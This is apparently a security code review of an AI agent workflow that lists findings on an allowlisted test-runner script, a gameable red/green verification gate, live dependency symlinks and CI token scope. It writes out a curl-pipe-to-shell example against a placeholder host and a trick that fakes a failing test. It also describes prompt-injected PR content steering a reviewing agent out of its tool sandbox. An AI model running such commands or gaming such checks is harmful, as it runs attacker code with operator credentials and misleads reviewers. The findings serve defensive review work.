findings.title: [P1] Restrict execution before allowlisting the test runner
findings.body: The review permission allowlist now permits red-test-check.sh with arbitrary arguments, but that script executes the supplied argv without restricting the executable. For example, `--red HEAD~1 -- bash -c '<command>'` runs arbitrary shell code with inherited credentials and access to the live repository. A contributor-controlled test command in reviewer.md can therefore bypass the review workflow's command restrictions and State-zone-only write policy. Constrain this permission or execute tests in an isolated environment without live repository write access or credentials.

findings.failure_mode: The review permission allowlist now permits red-test-check.sh with arbitrary arguments, but that script executes the supplied argv without restricting the executable.

findings.cross_file_justification: SKILL.md line 6 and the hook allowlist at lines 27-28 add `Bash(.claude/scripts/red-test-check.sh *)`. red-test-check.sh (lines 97, 103, 248-250, 308, 313) execs every argument after `--` verbatim via `exec "$@"` in run_bounded, and `--setup` (lines 111-114, 288-299) is likewise split and exec'd. SKILL.md line 219 instructs the reviewer to take both the commit and the test command from the engineer-authored reviewer.md.
findings.description: The reviewing-code skill's allowed-tools list was a deliberate sandbox: `git diff`, `git log`, and a handful of fixed scripts. Adding `red-test-check.sh *` turns it into an arbitrary command execution primitive. Anything after `--` (and anything in `--setup`) is exec'd with the operator's full privileges, e.g. `red-test-check.sh --red HEAD~1 -- bash -c 'curl https://x/p | sh'`. The script explicitly refuses only a leading `-` on `--red`/`--green`; the test argv is never constrained. Worse, the skill (line 219) tells the reviewing agent to copy the test command out of `reviewer.md`, which is written by the engineer agent from PR content. Prompt-injected or malicious PR content therefore drives the command that the reviewer runs outside its intended tool boundary, in both worktrees, with the live repo reachable through the worktree's `.git` pointer and the symlinked dependency directories.
findings.failure_mode: A PR or reviewer.md containing an injected 'test command' causes the review agent to execute arbitrary shell as the operator, bypassing the skill's allowed-tools sandbox; the agent reports it as a routine red/green check.
findings.suggested_fix: Do not expose an open-ended `*` pass-through from a constrained skill. Options: (a) have red-test-check.sh read the test command from a committed, operator-owned config (e.g. `.loa.config.yaml` bug.test_command) and reject argv commands when invoked from the review skill; (b) constrain argv[0] to a fixed runner allowlist (bats, pytest, npm, pnpm, yarn, cargo, go, make) and reject shells/interpreters (bash, sh, python -c, node -e, curl, wget) and absolute/relative paths; (c) at minimum narrow the allowed-tools pattern to `Bash(.claude/scripts/red-test-check.sh --red * -- bats *)` style fixed prefixes and drop `--setup` from the reviewer path.

findings.cross_file_justification: SKILL.md line 219 and micro-sprint.md line 43 instruct the reviewer to run `red-test-check.sh --red <Red commit> -- <test command>` without `--test-file`, so the D-7.6 existence check at red-test-check.sh lines 159-163 never fires. The verdict then depends solely on the NOT_A_RED_PATTERNS heuristics (lines 52-71) and the 126/127 exit check (lines 326-329).
findings.description: An engineer can obtain `VERIFIED` by pointing `--red` at any strict ancestor that predates the test file. Without `--test-file`, the only defence is pattern matching on the red run's output, and the list misses the most common 'file not found' outputs: pytest exits 4 with `ERROR: file or directory not found: tests/test_x.py` (no pattern matches; exit 4 is not 126/127), `go test ./pkg` prints `directory not found` / `no Go files in`, `cargo test --test name` prints `no test target named`, mocha prints `Error: No test files found`. All of these are non-zero, non-timeout, pattern-free failures, so the red side reads as a genuine assertion failure, the green side passes, and the script exits 0. The reviewer is told to cite this output as proof of 'Test fails with current code'.
findings.failure_mode: A micro-sprint that never had a failing test passes the red/green gate: the reviewer cites `verdict: VERIFIED` for a commit where the test simply did not exist.
findings.suggested_fix: Make `--test-file` mandatory (or infer it: fail when the test argv names a path that does not exist at the red commit). Add patterns for `file or directory not found`, `No test files found`, `no test target named`, `directory not found`, `no Go files`, `ENOENT`, and treat pytest exit 4 / cargo exit 101-without-tests as NOT_A_RED. Update SKILL.md line 219 and micro-sprint.md line 43 to pass `--test-file`.

findings.description: The gate is trivially gameable by the party it is meant to check. (1) Worktree paths are fixed at `$SCRATCH/red` and `$SCRATCH/green` (lines 301, 303), so a test can self-select with `[[ ${PWD##*/} == red ]] && exit 1` and pass at green without exercising anything. (2) Both worktrees are created and prepared (lines 302-306) before the red run (line 308); the red test can write into `../green` (predictable sibling) to make the green run pass. (3) The green commit may rewrite or delete the test file; the only check (lines 165-181) WARNs when *no* non-test file changed, so a green that touches one source file plus the test file is silent. The header admits the check does not prove the assertion is right, but the SKILL.md instruction has the reviewer cite its output as evidence for the 'Test fails with current code' AC, which is exactly the claim these bypasses defeat.
findings.failure_mode: An engineer agent (or a PR under prompt injection) produces a `VERIFIED` verdict for a decoy test; the reviewer cites the script output and approves.
findings.suggested_fix: Use random worktree directory names (`mktemp -d` under SCRATCH) and run the green worktree creation after the red run completes. Compare the blob of `--test-file` (and every path matched by is_test_path) between red and green and emit a violation or at least a loud WARN when it differs; include `test_file_changed` in the JSON. Set `TMPDIR` for the test run to a per-run scratch so the sibling worktree is not reachable via relative paths.

findings.description: link_deps is on by default (LINK_DEPS=1, line 85) and symlinks the live tree's `node_modules .venv vendor target .tox` into the checkout of an arbitrary historical commit chosen by the engineer. Code from that commit runs with write access to the operator's persistent dependency directories: a test can drop a modified module into live `node_modules/`, a `.pth` or sitecustomize into `.venv/`, or a build artifact into `target/`, and that payload executes later in the operator's normal sessions, long after the scratch worktrees are deleted. The header documents the write-through but frames it as a correctness note, not a trust-boundary issue, and the reviewer-facing instruction never mentions `--no-link-deps`.
findings.failure_mode: A malicious or injected test at the red commit plants a persistent payload in the operator's live virtualenv or node_modules; subsequent `npm test`/`python` runs in the live tree execute it.
findings.suggested_fix: Default to `--no-link-deps` and require an explicit `--link-deps` opt-in; when linking, prefer a read-only bind/copy (e.g. `cp -al` hardlink farm or `mount --bind -o ro` where available). At minimum, have the review skill pass `--no-link-deps` and surface `linked_deps` in the reviewer's cited output.

findings.description: The new workflow executes repository-controlled scripts (`tools/check-glossary-terms.sh`, `validate-artifact.sh`) on `pull_request` and `push` but declares no `permissions:` block, so the GITHUB_TOKEN inherits the repository default (which may be read-write for push events on `main`). The checkout action is correctly pinned by SHA and the trigger is `pull_request`, not `pull_request_target`, so PR-driven impact is limited, but the push-to-main path runs with whatever default scope the org configured.
findings.failure_mode: A compromised dependency of the glossary scripts (or a malicious merge to main) could use an over-scoped GITHUB_TOKEN to modify repository contents or metadata.
findings.suggested_fix: Add a top-level `permissions:\n  contents: read` block to the workflow (matching the cycle-098 supply-chain pattern the comment references).
